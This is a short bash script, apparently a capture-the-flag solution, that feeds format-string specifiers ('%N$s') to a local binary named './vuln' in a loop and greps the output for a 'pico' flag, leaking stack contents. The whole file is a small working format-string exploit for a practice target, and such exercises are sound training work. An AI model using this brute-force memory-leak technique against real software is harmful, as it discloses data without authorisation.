#!/bin/bash
for ((i = 1; i < 100; i++))
do
    echo -e "%$i\$s" | ./vuln |grep "pico"
done